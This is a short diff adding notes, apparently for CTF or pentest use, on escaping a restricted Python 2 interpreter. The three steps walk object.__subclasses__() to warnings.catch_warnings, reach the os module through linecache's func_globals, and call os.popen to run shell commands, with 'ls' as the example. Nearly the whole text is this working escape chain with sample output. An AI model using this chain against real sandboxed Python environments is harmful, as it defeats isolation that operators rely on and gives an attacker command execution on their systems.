@@ -1,0 +1,12 @@
+1. Get Index of subclass warnings.catch_warnings
+   >>> import warnings
+   >>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
+   59    --> output command above
+
+2. Choose module linecache from the global function to get module os index
+   >>> import os
+   >>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__.values().index(os)
+   12    --> output command above
+
+3. Now you can use module os as always with this command. For example, i use popen.
+   >>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__.values()[12].popen("ls").read()
